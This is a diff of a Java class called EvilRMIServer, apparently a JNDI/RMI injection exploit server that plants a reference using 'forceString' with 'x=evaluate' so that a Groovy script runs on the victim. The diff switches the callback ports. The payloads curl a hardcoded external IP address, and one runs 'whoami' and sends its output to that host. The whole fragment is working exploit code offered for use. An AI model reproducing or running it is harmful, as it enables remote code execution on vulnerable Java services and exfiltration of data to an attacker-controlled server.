@@ -39,9 +39,9 @@ public class EvilRMIServer {
         ref.add(new StringRefAddr("forceString", "x=evaluate"));
         //String script = String.format("'%s'.execute()", commandGenerator.getBase64CommandTpl());
 
-        String cmd = "curl 18.162.60.133:8080/proc.text";
+        String cmd = "curl 18.162.60.133:443/proc.text";
         String script = String.format("'%s'.execute()", cmd);
-        script = "def a = 'whoami'.execute().text;def b = 'curl 18.162.60.133:8080/'+a;b.execute()";
+        script = "def a = 'whoami'.execute().text;def b = 'curl 18.162.60.133:443/'+a;b.execute()";
         System.out.println(script);
         ref.add(new StringRefAddr("x",script));
         System.out.println(new StringRefAddr("x",script));
@@ -57,7 +57,7 @@ public class EvilRMIServer {
     public static void main(String[] args) throws Exception{
 
         System.out.println("Creating evil RMI registry on port 8080");
-        Registry registry = LocateRegistry.createRegistry(443);
+        Registry registry = LocateRegistry.createRegistry(8080);
         String ip = args[0];
         System.out.println(ip);
         EvilRMIServer evilRMIServer = new EvilRMIServer(new Listener(ip,7777));
